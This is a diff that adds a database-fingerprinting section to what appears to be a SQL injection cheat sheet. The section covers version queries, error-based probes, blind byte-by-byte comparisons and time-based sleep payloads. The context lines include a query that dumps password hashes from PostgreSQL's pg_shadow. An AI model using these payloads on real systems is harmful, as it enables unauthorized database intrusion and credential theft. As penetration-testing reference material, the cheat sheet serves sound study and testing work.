@@ -301,3 +301,28 @@ postgres=$ select usename, passwd from pg_catalog.pg_shadow;
 postgres=$ select name, setting from pg_catalog.pg_settings;
 oracle> SELECT * FROM all_users
 ```
+<br />
+
+## DBMS Fingerprinting
+#### ___when output of query is showed___ : use environment variable and functions each DBMS support. -> get dbms version
+```sql
+select @@version
+select version()
+```
+#### ___when error message being printed___ : about error based sqli...
+```sql
+select 1 union select 1, 2;
+# MySQL => ERROR 1222 (21000): The used SELECT statements have a different number of columns
+(select * from not_exists_table)
+# SQLite => Error: no such table: not_exists_table
+```
+#### ___when can check boolean output of query___ : about blind sqli... : compare byte by byte
+```sql
+mid(@@version, 1, 1)='5';
+substr(version(), 1, 1)='P';
+```
+#### ___Exception___ : if not any showing, use time based sqli
+```sql
+sleep(10)
+pg_sleep(10)
+```
